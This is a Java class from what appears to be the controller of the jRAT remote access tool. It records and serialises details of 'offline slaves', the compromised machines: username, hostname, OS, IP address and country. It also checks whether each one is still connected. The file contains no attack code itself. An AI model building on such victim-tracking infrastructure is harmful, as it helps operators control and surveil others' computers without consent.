package io.jrat.controller;

import java.util.Random;


public class OfflineSlave extends AbstractSlave {

	protected String os;
	protected long creation = System.currentTimeMillis();
	protected long randomId = newRandomId();
	
	public OfflineSlave(AbstractSlave slave) {
		this(slave.getUsername(), slave.getHostname(), slave.getOperatingSystem().getType().getName(), slave.getID(), slave.getVersion(), slave.getRawIP(), slave.getCountry());
	}
	
	public OfflineSlave(String username, String hostname, String longosname, String id, String version, String ip, String country) {
		this(username, hostname, longosname, id, version, ip, country, System.currentTimeMillis());
	}
	
	public OfflineSlave(String username, String hostname, String longosname, String id, String version, String ip, String country, long creation) {
		super(null, null);
		super.username = username;
		super.hostname = hostname;
		this.os = longosname;
		super.id = id;
		super.version = version;
		super.ip = ip;
		super.country = country;
		this.creation = creation;
	}
	
	public static OfflineSlave fromString(String s) {
		String[] array = s.split(":");
		OfflineSlave os = new OfflineSlave(array[0], array[1], array[2], array[3], array[4], array[5], array[6], Long.parseLong(array[8]));
		return os;
	}
	
	public static String toString(OfflineSlave slave) {
		StringBuilder sb = new StringBuilder();
		sb.append(slave.username + ":");
		sb.append(slave.hostname + ":");
		sb.append(slave.os + ":");
		sb.append(slave.id + ":");
		sb.append(slave.version + ":");
		sb.append(slave.ip + ":");
		sb.append(slave.country + ":");
		sb.append(slave.randomId + ":");
		sb.append(slave.creation);
		
		return sb.toString();
	}
	
	public String getString() {
		return OfflineSlave.toString(this);
	}

	public boolean isOnline() {
		for (AbstractSlave slave : Main.connections) {
			OfflineSlave os = new OfflineSlave(slave);
			
			if (os.equals(this)) {
				return true;
			}
		}
		
		return false;
	}
	
	public long getCreation() {
		return creation;
	}
	
	public void setCreation(long creation) {
		this.creation = creation;
	}
	
	public long getRandomId() {
		return randomId;
	}
	
	public static long newRandomId() {
		int i = -new Random().nextInt(Integer.MAX_VALUE);
		return i;
	}
	
	@Override
	public boolean equals(Object o) {
		if (o instanceof OfflineSlave) {
			OfflineSlave os = (OfflineSlave)o;
			
			return os.username.equals(this.username) && os.hostname.equals(this.hostname) && os.id.equals(this.id) && os.version.equals(this.version) && os.ip.equals(this.ip);
		} else {
			return false;
		}
	}

	@Override
	public void ping() {
		throw new RuntimeException("Can't ping offline slave");
	}

	@Override
	public void run() {

	}

}
